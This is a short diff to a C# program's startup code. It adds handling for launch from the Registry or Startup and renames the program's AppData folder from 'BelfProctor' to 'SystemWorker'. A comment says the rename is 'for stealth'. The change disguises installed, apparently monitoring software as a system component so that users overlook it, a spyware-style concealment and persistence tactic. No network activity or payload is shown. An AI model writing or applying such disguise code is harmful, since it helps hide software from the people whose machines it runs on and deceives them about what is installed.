@@ -13,12 +13,15 @@ public class Program
 {
     public static async Task Main(string[] args)
     {
+        // Fix for running from Registry/Startup where CWD might be System32
+        Directory.SetCurrentDirectory(AppDomain.CurrentDomain.BaseDirectory);
+
         var builder = Host.CreateApplicationBuilder(args);
 
         var environment = builder.Environment.EnvironmentName;
         
-        // Ensure AppData directory exists for persistent config
-        var localAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "BelfProctor");
+        // Ensure AppData directory exists for persistent config (Using "SystemWorker" folder for stealth)
+        var localAppData = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SystemWorker");
         Directory.CreateDirectory(localAppData);
         var appDataConfig = Path.Combine(localAppData, "appsettings.json");
 
